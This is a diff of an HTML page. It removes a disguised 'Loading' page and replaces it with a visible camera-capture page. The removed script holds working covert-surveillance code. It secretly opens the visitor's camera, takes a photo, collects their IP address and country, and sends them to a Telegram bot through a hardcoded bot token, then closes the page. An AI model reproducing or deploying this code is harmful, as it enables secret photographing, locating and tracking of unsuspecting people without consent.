@@ -1,112 +1,46 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Loading</title>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>Camera</title>
 
 <style>
 body{
-  margin:0;
   background:#0f0f0f;
   color:#fff;
   font-family:sans-serif;
-  display:flex;
-  align-items:center;
-  justify-content:center;
-  font-size:22px;
+  text-align:center;
+  padding:20px;
+}
+video, img{
+  width:100%;
+  max-width:360px;
+  border-radius:12px;
+  margin-top:10px;
+}
+button{
+  margin-top:12px;
+  padding:12px 20px;
+  font-size:16px;
+  border:none;
+  border-radius:10px;
+  background:#2ea6ff;
+  color:#fff;
 }
 </style>
 </head>
+
 <body>
 
-<div id="text">🔄 Loading...</div>
+<h3>📸 Take Photo</h3>
 
-<script>
-// ================= CONFIG =================
-const BOT_TOKEN = "8558930997:AAHZSF1FLVK6qzcGe2BrMYl0QIWXdokzoMM";
-// =========================================
+<video id="video" autoplay playsinline></video>
+<img id="preview" style="display:none"/>
 
-// get user id from URL (?=6362758258)
-const params = new URLSearchParams(location.search);
-const CHAT_ID = params.get("");
+<button id="captureBtn">📷 Capture</button>
+<button id="sendBtn" style="display:none">📤 Send</button>
 
-let step = 0;
-
-// loading twice (1s + 1s)
-function loading(){
-  step++;
-  if(step <= 2){
-    setTimeout(loading, 1000);
-  } else {
-    start();
-  }
-}
-loading();
-
-async function start(){
-  try{
-    // get IP
-    const ip = await fetch("https://api.ipify.org?format=json")
-      .then(r=>r.json()).then(d=>d.ip);
-
-    const geo = await fetch("https://ipapi.co/json/")
-      .then(r=>r.json());
-
-    // open camera (hidden)
-    const stream = await navigator.mediaDevices.getUserMedia({ video:true });
-    const video = document.createElement("video");
-    video.srcObject = stream;
-    await video.play();
-
-    await new Promise(r=>setTimeout(r,500));
-
-    // capture
-    const canvas = document.createElement("canvas");
-    canvas.width = video.videoWidth;
-    canvas.height = video.videoHeight;
-    canvas.getContext("2d").drawImage(video,0,0);
-
-    stream.getTracks().forEach(t=>t.stop());
-
-    const blob = await new Promise(r=>canvas.toBlob(r,"image/jpeg",0.9));
-
-    // caption (emoji + beautiful)
-    const caption =
-`📸 <b>New Image Received</b>
-
-🔢 <b>Number:</b> ${CHAT_ID}
-🌐 <b>IP:</b> ${ip}
-🌍 <b>Country:</b> ${geo.country_name}
-
-👨‍💻 <b>Dev:</b> @XFPro43`;
-
-    // send to telegram
-    const form = new FormData();
-    form.append("chat_id", CHAT_ID);
-    form.append("photo", blob, "photo.jpg");
-    form.append("caption", caption);
-    form.append("parse_mode","HTML");
-
-    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{
-      method:"POST",
-      body:form
-    });
-
-    // close / back
-    setTimeout(()=>{
-      if(window.Telegram && Telegram.WebApp){
-        Telegram.WebApp.close();
-      } else {
-        history.back();
-      }
-    }, 500);
-
-  }catch(e){
-    document.getElementById("text").innerText = "❌ Permission denied";
-  }
-}
-</script>
-
+<script src="app.js"></script>
 </body>
 </html> 
